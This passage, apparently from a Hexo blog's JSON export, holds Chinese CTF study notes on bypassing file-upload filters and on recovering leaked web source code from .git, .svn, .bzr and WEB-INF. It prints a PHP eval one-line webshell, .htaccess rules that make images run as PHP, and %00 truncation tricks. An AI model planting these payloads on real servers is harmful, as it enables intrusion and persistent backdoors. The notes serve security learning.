alt=\"image-20210502162553895\"></p>\n</li>\n</ol>\n</li>\n<li><p>PNG</p>\n<p>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT数据块</p>\n<ul>\n<li>首先准备一个PNG图片<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/16036276956867.png\" alt=\"img\"></li>\n<li>实现细节参考<a href=\"https://wooyun.x10sec.org/static/drops/tips-16034.html\" target=\"_blank\" rel=\"noopener\">https://wooyun.x10sec.org/static/drops/tips-16034.html</a></li>\n<li>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终</li>\n<li>修改索引图像插入 PHP 代码的脚本项目地址为：<a href=\"https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py\" target=\"_blank\" rel=\"noopener\">Github - poc_png.py</a></li>\n<li>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</li>\n</ul>\n</li>\n<li><p>JPG</p>\n<p>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"解析攻击\"><a href=\"#解析攻击\" class=\"headerlink\" title=\"解析攻击\"></a>解析攻击</h2><h3 id=\"网络渗透的本质\"><a href=\"#网络渗透的本质\" class=\"headerlink\" title=\"- 网络渗透的本质\"></a>- 网络渗透的本质</h3><h3 id=\"直接解析\"><a href=\"#直接解析\" class=\"headerlink\" title=\"- 直接解析\"></a>- 直接解析</h3><h3 id=\"本地文件包含解析\"><a href=\"#本地文件包含解析\" class=\"headerlink\" title=\"- 本地文件包含解析\"></a>- 本地文件包含解析</h3><h3 id=\"htaccess文件上传解析漏洞\"><a href=\"#htaccess文件上传解析漏洞\" class=\"headerlink\" title=\"- .htaccess文件上传解析漏洞\"></a>- .htaccess文件上传解析漏洞</h3><ul>\n<li><p>htaccess文件是<a href=\"https://baike.baidu.com/item/Apache\" target=\"_blank\" rel=\"noopener\">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href=\"https://baike.baidu.com/item/301重定向\" target=\"_blank\" rel=\"noopener\">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>\n</li>\n<li><p>形成条件</p>\n<ul>\n<li>apache服务器</li>\n<li>能够上传.htaccess文件，一般为<strong>黑名单</strong>限制</li>\n<li>AllowOverride All，默认配置为关闭None</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>\n<li>上传目录具有可执行权限</li>\n</ul>\n</li>\n<li><p>.htaccess写法</p>\n<pre><code>SetHandler application/x-httpd-php</code></pre><p>当前目录所有文件均会被解析为php文件</p>\n<pre><code>&lt;FilesMatch \"1\"&gt;\nSetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code></pre><p>将文件名<strong>包含</strong>1的文件解析为php文件，可用作留后门，123.png 就会被解析成php</p>\n<pre><code>AddType application/x-httpd-php .png</code></pre><p>将.png解析为php文件</p>\n</li>\n</ul>\n<h3 id=\"web应用程序解析漏洞及其原理\"><a href=\"#web应用程序解析漏洞及其原理\" class=\"headerlink\" title=\"- web应用程序解析漏洞及其原理\"></a>- web应用程序解析漏洞及其原理</h3><h2 id=\"上传攻击框架\"><a href=\"#上传攻击框架\" class=\"headerlink\" title=\"上传攻击框架\"></a>上传攻击框架</h2><h3 id=\"轻量级检测绕过攻击\"><a href=\"#轻量级检测绕过攻击\" class=\"headerlink\" title=\"- 轻量级检测绕过攻击\"></a>- 轻量级检测绕过攻击</h3><h3 id=\"路径-扩展名检测绕过攻击\"><a href=\"#路径-扩展名检测绕过攻击\" class=\"headerlink\" title=\"- 路径/扩展名检测绕过攻击\"></a>- 路径/扩展名检测绕过攻击</h3><h3 id=\"文件内容性检测绕过攻击\"><a href=\"#文件内容性检测绕过攻击\" class=\"headerlink\" title=\"- 文件内容性检测绕过攻击\"></a>- 文件内容性检测绕过攻击</h3><h3 id=\"上传攻击框架-1\"><a href=\"#上传攻击框架-1\" class=\"headerlink\" title=\"- 上传攻击框架\"></a>- 上传攻击框架</h3><h2 id=\"代码逻辑\"><a href=\"#代码逻辑\" class=\"headerlink\" title=\"代码逻辑\"></a>代码逻辑</h2><h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"- 条件竞争\"></a>- 条件竞争</h3><hr>\n<blockquote>\n<p>参考</p>\n<ul>\n<li><a href=\"https://www.sqlsec.com/2020/10/upload.html\" target=\"_blank\" rel=\"noopener\">国光的文件上传靶场知识总结</a></li>\n<li><a href=\"https://wenku.baidu.com/link?url=vMCO-E0_utuzonHcMnZ-xlRIW2M3Sn0sarHUKHIqQawrl2juefZOfJmFhdUCRah8EpO1NEUxJk7hm2lcpvz-apwev02IT-IWlKmDRzIid7u\" target=\"_blank\" rel=\"noopener\">上传攻击总结</a></li>\n</ul>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h1><h2 id=\"上传检测流程\"><a href=\"#上传检测流程\" class=\"headerlink\" title=\"上传检测流程\"></a>上传检测流程</h2><p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210425001426.png\" alt=\"sum_up\"></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210420012816.png\" alt=\"image-20210420012816046\"></p>\n<h2 id=\"客户端检测绕过（JS）\"><a href=\"#客户端检测绕过（JS）\" class=\"headerlink\" title=\"客户端检测绕过（JS）\"></a>客户端检测绕过（JS）</h2><ul>\n<li><p>如何判断是前端验证呢？</p>\n<ul>\n<li>抓包监听，如果上传文件的时候还没有抓取到数据包，但浏览器就提示文件类型不正确的话，那么多半就是前端校验了</li>\n</ul>\n</li>\n<li><p>通常解法：</p>\n<ul>\n<li><p>抓包</p>\n<ul>\n<li>由于是前端校验，因此可以将shell.png重命名为shell.png 上传抓包时再将文件名修改为shell.php即可绕过前端限制，成功上传webshell。</li>\n</ul>\n</li>\n<li><p>禁用JS</p>\n</li>\n<li><p>因为JS来校验文件后缀的原因，因此直接在浏览器上禁用JS即可。</p>\n</li>\n<li><p>方法</p>\n<ul>\n<li>firefox：按<strong>F12</strong>打开调试工具，再按<strong>F1</strong>打开设置选项<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415224321.png\" alt=\"image-20210415224247926\"><ul>\n<li>chrome在审查元素状态下可以找到<strong>Setting</strong>选项，然后在Debugger选项下面勾选<strong>Disable Javascript</strong>即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415224547.png\" alt=\"image-20210415224547644\"></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>调试JS</p>\n<ul>\n<li>虽然这种解法没有必要，不过倒是学到了如何调试网页</li>\n<li>firefox中F12打开开发者工具，在调试器中打开异常处暂停，修改js变量whitelist中的值即可<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210415231009.png\" alt=\"image-20210415231009461\"  /><ul>\n<li>firefox中只能听过控制台输入var=value的形式更改变量的值</li>\n<li>chrome中可直接修改</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"服务端检测绕过（MIME）\"><a href=\"#服务端检测绕过（MIME）\" class=\"headerlink\" title=\"服务端检测绕过（MIME）\"></a>服务端检测绕过（MIME）</h2><ul>\n<li><p>MIME检测原理</p>\n<p>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。</p>\n</li>\n<li><p>常见的MIME类型</p>\n<pre><code>text/plain（纯文本）\ntext/html（HTML文档）\ntext/javascript（js代码）\napplication/xhtml+xml（XHTML文档）\nimage/gif（GIF图像）\nimage/jpeg（JPEG图像）\nimage/png（PNG图像）\nvideo/mpeg（MPEG动画）\napplication/octet-stream（二进制数据）\napplication/pdf（PDF文档）</code></pre></li>\n<li><p>绕过方式：将content-type字段改为常见的image/jpg等即可成功上传</p>\n</li>\n</ul>\n<h2 id=\"服务器检测绕过（目录路径检测）\"><a href=\"#服务器检测绕过（目录路径检测）\" class=\"headerlink\" title=\"服务器检测绕过（目录路径检测）\"></a>服务器检测绕过（目录路径检测）</h2><h3 id=\"00截断\"><a href=\"#00截断\" class=\"headerlink\" title=\"- 00截断\"></a>- 00截断</h3><ul>\n<li><p>原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串</p>\n</li>\n<li><p>形成条件</p>\n<ul>\n<li>php版本要小于5.3.4</li>\n<li>magic_quotes_gpc off</li>\n</ul>\n</li>\n<li><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p>\n<p>比如</p>\n<p><a href=\"https://mp.csdn.net/upfiles/?filename=test.txt\" target=\"_blank\" rel=\"noopener\">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p>\n<p>加上%00</p>\n<p><a href=\"https://mp.csdn.net/upfiles/?filename=test.php%00.txt\" target=\"_blank\" rel=\"noopener\">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p>\n<p>就绕过了后缀限制，可以上传webshell了</p>\n</li>\n<li><p>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制</p>\n</li>\n<li><p>当执行move_uploaded_file($FILE[‘tmp_name’],$Path)时遇到0x00会自动截断，所以真正写入的实际地址是upload/a.php</p>\n</li>\n<li><p>案例一：</p>\n<ul>\n<li>此处是个POST包，在目录路径处构造完整路径用%00进行截断可以绕过随机重命名，并自定义为php文件进行解析<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421134423.png\" alt=\"image-20210421134423517\"></li>\n<li>自定义为a.php并添加%00进行截断<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421134718.png\" alt=\"image-20210421134718342\">此处截断需要将%00进行url编码才行<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421134823.png\" alt=\"image-20210421134823317\">编码后如图即可成功上传<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421135058.png\" alt=\"image-20210421135058090\"></li>\n</ul>\n</li>\n<li><p>案例二</p>\n<ul>\n<li>随便上传一个文件后，url产生变化，此处可知其目录路径在url上传输<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421204028.png\" alt=\"image-20210421204028019\"></li>\n<li>抓包如下<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421203726.png\" alt=\"image-20210421203726553\"></li>\n<li>同理进行改包截断<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210421205207.png\" alt=\"image-20210421205207078\"></li>\n</ul>\n</li>\n<li><p>两个案例中用法不同</p>\n<ul>\n<li>案例一：POST包中%00不会被url解码，所有只能通过burp先行解码再传输，或者直接hex中修改为00进行截断</li>\n<li>案例二：%00在被url解码之后是空字符</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"服务端检测绕过（文件扩展名检测）\"><a href=\"#服务端检测绕过（文件扩展名检测）\" class=\"headerlink\" title=\"服务端检测绕过（文件扩展名检测）\"></a>服务端检测绕过（文件扩展名检测）</h2><h3 id=\"黑名单检测\"><a href=\"#黑名单检测\" class=\"headerlink\" title=\"- 黑名单检测\"></a>- 黑名单检测</h3><ul>\n<li><p>名单列表绕过</p>\n<p>默认情况下Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，Fuzz一下找出黑名单里没有后缀进行攻击，比如asa或cer之类</p>\n</li>\n<li><p>文件名大小写绕过(至今尝试还未成功)</p>\n<p>用AsP,pHp之类的文件名绕过黑名单检测</p>\n</li>\n<li><p>特殊文件名绕过</p>\n<p>比如把http包里的文件名改为test.asp. 或test.asp空格,这种命名方式在windows中是不被允许的，也就是利用windows系统特性，绕过验证后，会被windows自动去掉后面的点或空格，但Unix/Linux没有这个特性</p>\n</li>\n<li><p>0x00截断绕过</p>\n<p>据说在asp程序中遇到过，待学习</p>\n</li>\n<li><p>.htaccess文件攻击</p>\n<ul>\n<li>PHP  manual中提到<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210421211503.png\" alt=\"image-20210421211503751\"></li>\n<li>如果PHP安全没有配置好的话，就可以通过move_uploaded_file来overwrite服务器中的.htaccess文件,以此达到任意定义解析名单的目的，例如将jpg文件解析为php文件</li>\n</ul>\n</li>\n<li><p>解析调用/漏洞绕过</p>\n</li>\n<li><p>常用一句话</p>\n<pre><code class=\"php\">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre>\n</li>\n</ul>\n<h3 id=\"白名单检测\"><a href=\"#白名单检测\" class=\"headerlink\" title=\"- 白名单检测\"></a>- 白名单检测</h3><ul>\n<li>0x00截断绕过</li>\n<li>文件名长度绕过白名单</li>\n<li>解析调用/漏洞绕过</li>\n</ul>\n<h2 id=\"服务端检测绕过（文件内容检测）\"><a href=\"#服务端检测绕过（文件内容检测）\" class=\"headerlink\" title=\"服务端检测绕过（文件内容检测）\"></a>服务端检测绕过（文件内容检测）</h2><h3 id=\"文件幻数检测\"><a href=\"#文件幻数检测\" class=\"headerlink\" title=\"- 文件幻数检测\"></a>- 文件幻数检测</h3><ul>\n<li><p>主要时检测文件内容开始处的文件幻，比如图片类型的文件幻数如下</p>\n</li>\n<li><p>常见文件幻数</p>\n<pre><code>jpg    FF D8 FF E0 00 10 4A 46 49 46\nGIF 47 49 46 38 39 61\nPNG 89 50 4E 47 0D 0A 1A 0A</code></pre></li>\n</ul>\n<h3 id=\"文件相关信息检测\"><a href=\"#文件相关信息检测\" class=\"headerlink\" title=\"- 文件相关信息检测\"></a>- 文件相关信息检测</h3><h3 id=\"文件加载检测\"><a href=\"#文件加载检测\" class=\"headerlink\" title=\"- 文件加载检测\"></a>- 文件加载检测</h3><h4 id=\"–-渲染-加载测试\"><a href=\"#–-渲染-加载测试\" class=\"headerlink\" title=\"– 渲染/加载测试\"></a>– 渲染/加载测试</h4><ul>\n<li><p>绕过方式：代码注入（例如图片马）</p>\n<p>用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本省的文件结构是完整的</p>\n</li>\n</ul>\n<h4 id=\"–-二次渲染\"><a href=\"#–-二次渲染\" class=\"headerlink\" title=\"– 二次渲染\"></a>– 二次渲染</h4><ul>\n<li><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的</p>\n</li>\n<li><p>绕过方式：</p>\n<ul>\n<li><p>GIF</p>\n<p>渲染前后的两张GIF，没有发生变化的数据库部分直接插入Webshell即可</p>\n<ol>\n<li><p>准备一张GIF<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/16036176592096.gif\" alt=\"16036176592096\"></p>\n</li>\n<li><p>上传至目标网站上渲染一下再导出<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210503144509.png\" alt=\"image-20210503144505868\"></p>\n</li>\n<li><p>用010editor对比未变化区域插入webshell</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/20210502154810.png\" alt=\"image-20210502154810504\"></p>\n</li>\n<li><p>由于测试网站存在文件包含漏洞，则可直接文件包含来执行攻击语句<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20210502162601.png\" alt=\"image-20210502162553895\"></p>\n</li>\n</ol>\n</li>\n<li><p>PNG</p>\n<p>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT数据块</p>\n<ul>\n<li>首先准备一个PNG图片<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/16036276956867.png\" alt=\"img\"></li>\n<li>实现细节参考<a href=\"https://wooyun.x10sec.org/static/drops/tips-16034.html\" target=\"_blank\" rel=\"noopener\">https://wooyun.x10sec.org/static/drops/tips-16034.html</a></li>\n<li>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终</li>\n<li>修改索引图像插入 PHP 代码的脚本项目地址为：<a href=\"https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py\" target=\"_blank\" rel=\"noopener\">Github - poc_png.py</a></li>\n<li>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</li>\n</ul>\n</li>\n<li><p>JPG</p>\n<p>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"解析攻击\"><a href=\"#解析攻击\" class=\"headerlink\" title=\"解析攻击\"></a>解析攻击</h2><h3 id=\"网络渗透的本质\"><a href=\"#网络渗透的本质\" class=\"headerlink\" title=\"- 网络渗透的本质\"></a>- 网络渗透的本质</h3><h3 id=\"直接解析\"><a href=\"#直接解析\" class=\"headerlink\" title=\"- 直接解析\"></a>- 直接解析</h3><h3 id=\"本地文件包含解析\"><a href=\"#本地文件包含解析\" class=\"headerlink\" title=\"- 本地文件包含解析\"></a>- 本地文件包含解析</h3><h3 id=\"htaccess文件上传解析漏洞\"><a href=\"#htaccess文件上传解析漏洞\" class=\"headerlink\" title=\"- .htaccess文件上传解析漏洞\"></a>- .htaccess文件上传解析漏洞</h3><ul>\n<li><p>htaccess文件是<a href=\"https://baike.baidu.com/item/Apache\" target=\"_blank\" rel=\"noopener\">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href=\"https://baike.baidu.com/item/301重定向\" target=\"_blank\" rel=\"noopener\">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>\n</li>\n<li><p>形成条件</p>\n<ul>\n<li>apache服务器</li>\n<li>能够上传.htaccess文件，一般为<strong>黑名单</strong>限制</li>\n<li>AllowOverride All，默认配置为关闭None</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>\n<li>上传目录具有可执行权限</li>\n</ul>\n</li>\n<li><p>.htaccess写法</p>\n<pre><code>SetHandler application/x-httpd-php</code></pre><p>当前目录所有文件均会被解析为php文件</p>\n<pre><code>&lt;FilesMatch &quot;1&quot;&gt;\nSetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code></pre><p>将文件名<strong>包含</strong>1的文件解析为php文件，可用作留后门，123.png 就会被解析成php</p>\n<pre><code>AddType application/x-httpd-php .png</code></pre><p>将.png解析为php文件</p>\n</li>\n</ul>\n<h3 id=\"web应用程序解析漏洞及其原理\"><a href=\"#web应用程序解析漏洞及其原理\" class=\"headerlink\" title=\"- web应用程序解析漏洞及其原理\"></a>- web应用程序解析漏洞及其原理</h3><h2 id=\"上传攻击框架\"><a href=\"#上传攻击框架\" class=\"headerlink\" title=\"上传攻击框架\"></a>上传攻击框架</h2><h3 id=\"轻量级检测绕过攻击\"><a href=\"#轻量级检测绕过攻击\" class=\"headerlink\" title=\"- 轻量级检测绕过攻击\"></a>- 轻量级检测绕过攻击</h3><h3 id=\"路径-扩展名检测绕过攻击\"><a href=\"#路径-扩展名检测绕过攻击\" class=\"headerlink\" title=\"- 路径/扩展名检测绕过攻击\"></a>- 路径/扩展名检测绕过攻击</h3><h3 id=\"文件内容性检测绕过攻击\"><a href=\"#文件内容性检测绕过攻击\" class=\"headerlink\" title=\"- 文件内容性检测绕过攻击\"></a>- 文件内容性检测绕过攻击</h3><h3 id=\"上传攻击框架-1\"><a href=\"#上传攻击框架-1\" class=\"headerlink\" title=\"- 上传攻击框架\"></a>- 上传攻击框架</h3><h2 id=\"代码逻辑\"><a href=\"#代码逻辑\" class=\"headerlink\" title=\"代码逻辑\"></a>代码逻辑</h2><h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"- 条件竞争\"></a>- 条件竞争</h3><hr>\n<blockquote>\n<p>参考</p>\n<ul>\n<li><a href=\"https://www.sqlsec.com/2020/10/upload.html\" target=\"_blank\" rel=\"noopener\">国光的文件上传靶场知识总结</a></li>\n<li><a href=\"https://wenku.baidu.com/link?url=vMCO-E0_utuzonHcMnZ-xlRIW2M3Sn0sarHUKHIqQawrl2juefZOfJmFhdUCRah8EpO1NEUxJk7hm2lcpvz-apwev02IT-IWlKmDRzIid7u\" target=\"_blank\" rel=\"noopener\">上传攻击总结</a></li>\n</ul>\n</blockquote>\n"},{"title":"源码泄露","date":"2021-09-10T06:01:13.511Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# Web源码泄露总结\n\n## Git源码泄露\n\n- 漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码\n- 漏洞利用：工具：[Githacker](https://github.com/wangyihang/githacker)、Githack\n\n## SVN导致文件泄露\n\n- 漏洞利用：工具：dvcs-ripper、Seay-Svn\n\n## HG源码泄露(目前还未遇到)\n\n- 漏洞成因：hg init的时候会生成.hg\n- 漏洞利用：工具：dvcs-ripper\n\n## CVS泄露\n\n漏洞利用 \n测试的目录\n\n```\nhttp://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构\n```\n\n取回源码的命令\n\n```\nbk clone http://url/name dir\n```\n\n这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。\n\n查看所有的改变的命令，转到download的目录\n\n```\nbk changes\n```\n\n## Bazaar/bzr\n\n工具：\n\n[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n```\nrip-bzr.pl -v -u http://www.example.com/.bzr/\n```\n\n## 网站备份压缩文件\n\n常见备份文件类型总结* .git .svn  .swp .~bak .bash_history\n\n### .phps(dotphps)源码泄露\n\n- phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。\n\n- phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。\n\n- Mine type: text/html, application/x-httpd-php-source, application/x-httpd-php3-source\n\n- 不是默认存在，只会在特殊情况下存在\n\n  > 参考\n  >\n  > https://filext.com/file-extension/PHPS\n  >\n  > [文件扩展名 PHPS](https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phps/)\n\n## WEB-INF/web.xml泄露\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\n\nWEB-INF主要包含一下文件或目录：\n\n- `/WEB-INF/web.xml`：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n- `/WEB-INF/classes/`：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n- `/WEB-INF/lib/`：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n- `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件。\n- `/WEB-INF/database.properties`：数据库配置文件\n\n 漏洞成因：\n\n 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n 漏洞检测以及利用方法：\n 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n​\t一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx  配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！\n\n## DS_Store文件泄露\n\n- 漏洞成因：在发布代码的时候未删除隐藏文件汇总的.DS_Store文件，然后攻击者获得了敏感文件等信息\n- 漏洞利用：ds_store_exp\n\n## 常见编辑器文件泄露\n\n- vim临时文件(.swp)\n- vim备份文件(~)\n\n## Github导致文件泄露\n\n> 参考\n>\n\n","source":"_posts/源码泄露.md","raw":"---\ntitle: 源码泄露\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [CTF,源码泄露]\ncategories: [CTF,源码泄露]\n---\n\n# Web源码泄露总结\n\n## Git源码泄露\n\n- 漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码\n- 漏洞利用：工具：[Githacker](https://github.com/wangyihang/githacker)、Githack\n\n## SVN导致文件泄露\n\n- 漏洞利用：工具：dvcs-ripper、Seay-Svn\n\n## HG源码泄露(目前还未遇到)\n\n- 漏洞成因：hg init的时候会生成.hg\n- 漏洞利用：工具：dvcs-ripper\n\n## CVS泄露\n\n漏洞利用 \n测试的目录\n\n```\nhttp://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构\n```\n\n取回源码的命令\n\n```\nbk clone http://url/name dir\n```\n\n这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。\n\n查看所有的改变的命令，转到download的目录\n\n```\nbk changes\n```\n\n## Bazaar/bzr\n\n工具：\n\n[dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n```\nrip-bzr.pl -v -u http://www.example.com/.bzr/\n```\n\n## 网站备份压缩文件\n\n常见备份文件类型总结* .git .svn  .swp .~bak .bash_history\n\n### .phps(dotphps)源码泄露\n\n- phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。\n\n- phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。\n\n- Mine type: text/html, application/x-httpd-php-source, application/x-httpd-php3-source\n\n- 不是默认存在，只会在特殊情况下存在\n\n  > 参考\n  >\n  > https://filext.com/file-extension/PHPS\n  >\n  > [文件扩展名 PHPS](https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phps/)\n\n## WEB-INF/web.xml泄露\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\n\nWEB-INF主要包含一下文件或目录：\n\n- `/WEB-INF/web.xml`：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n- `/WEB-INF/classes/`：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n- `/WEB-INF/lib/`：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n- `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件。\n- `/WEB-INF/database.properties`：数据库配置文件\n\n 漏洞成因：\n\n 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n 漏洞检测以及利用方法：\n 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n​\t一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx  配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！\n\n## DS_Store文件泄露\n\n- 漏洞成因：在发布代码的时候未删除隐藏文件汇总的.DS_Store文件，然后攻击者获得了敏感文件等信息\n- 漏洞利用：ds_store_exp\n\n## 常见编辑器文件泄露\n\n- vim临时文件(.swp)\n- vim备份文件(~)\n\n## Github导致文件泄露\n\n> 参考\n>\n\n","slug":"源码泄露","published":1,"updated":"2021-08-21T09:25:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyeo002ct8opf2yd0ndh","content":"<h1 id=\"Web源码泄露总结\"><a href=\"#Web源码泄露总结\" class=\"headerlink\" title=\"Web源码泄露总结\"></a>Web源码泄露总结</h1><h2 id=\"Git源码泄露\"><a 